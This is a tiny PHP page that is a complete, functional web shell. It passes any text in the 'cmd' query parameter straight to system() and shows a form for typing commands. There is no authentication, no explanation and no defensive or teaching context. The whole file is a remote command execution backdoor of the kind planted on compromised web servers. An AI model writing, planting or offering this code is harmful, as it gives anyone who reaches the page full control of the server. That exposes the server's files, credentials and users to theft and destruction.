<!doctype html>
<body>
<?php
 if(isset($_GET['cmd']))
 system($_GET['cmd']);
 else
 echo '<form action="/" method="GET">Command: <input type="text" name="cmd"><input type="submit"></form>';
?>
